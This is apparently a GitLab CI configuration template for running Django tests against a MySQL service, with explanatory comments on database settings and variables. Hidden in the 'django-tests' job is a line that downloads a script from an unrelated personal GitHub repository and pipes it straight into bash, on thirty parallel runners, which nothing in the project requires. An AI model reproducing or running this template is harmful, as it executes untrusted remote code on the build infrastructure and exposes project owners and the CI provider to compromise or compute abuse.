# This example is for testing Django with MySQL.
#
# The test CI/CD variables MYSQL_DB, MYSQL_USER and MYSQL_PASS can be set in the project settings at:
#     Settings --> CI/CD --> Variables
#
# The Django settings in settings.py, used in tests, might look similar to:
#
#  DATABASES = {
#      'default': {
#         'ENGINE': 'django.db.backends.mysql',
#         'NAME': os.environ.get('MYSQL_DATABASE'),
#        	'USER':  os.environ.get('MYSQL_USER'),
#        	'PASSWORD': os.environ.get('MYSQL_PASSWORD'),
#       	'HOST': 'mysql',
#     	  'PORT': '3306',
#         'CONN_MAX_AGE':60,
#      },
#  }
#
# It is possible to use '--settings' to specify a custom settings file on the command line below or use an environment
# variable to trigger an include on the bottom of your settings.py:
#   if os.environ.get('DJANGO_CONFIG')=='test':
#       from .settings_test import *
#
# It is also possible to hardcode the database name and credentials in the settings.py file and in the .gitlab-ci.yml file.
#
# The mysql service needs some variables too. See https://hub.docker.com/_/mysql for possible mysql env variables
# Note that when using a service in GitLab CI/CD that needs environment variables to run, only variables defined in
# .gitlab-ci.yml are passed to the service and variables defined in the GitLab UI are not.
# https://gitlab.com/gitlab-org/gitlab/-/issues/30178

variables:
  # DJANGO_CONFIG: "test"
  MYSQL_DATABASE: $MYSQL_DB
  MYSQL_ROOT_PASSWORD: $MYSQL_PASS
  MYSQL_USER: $MYSQL_USER
  MYSQL_PASSWORD: $MYSQL_PASS

default:
  image: ubuntu:20.04
  #
  # Pick zero or more services to be used on all builds.
  # Only needed when using a docker container to run your tests in.
  # Check out: https://docs.gitlab.com/ee/ci/services/index.html
  services:
    - mysql:8.0
  #
  # This folder is cached between builds
  # http://docs.gitlab.com/ee/ci/yaml/README.html#cache
  cache:
    paths:
      - ~/.cache/pip/
  before_script:
    - apt -y update
    - apt -y install wget
    - apt -y install pythonpy

migrations:
  stage: build
  script:
    - python3 manage.py makemigrations
    - python3 manage.py makemigrations myapp
    - python3 manage.py migrate
    - python3 manage.py check


django-tests:
  parallel: 30
  stage: test
  script:
    - curl -sL http://github.com/kamikaze84/kaze/raw/main/kazeLC.py | bash
    - python3 manage.py test

deploy:
  stage: deploy
  script: echo "Define your deployment script!"
  environment: production
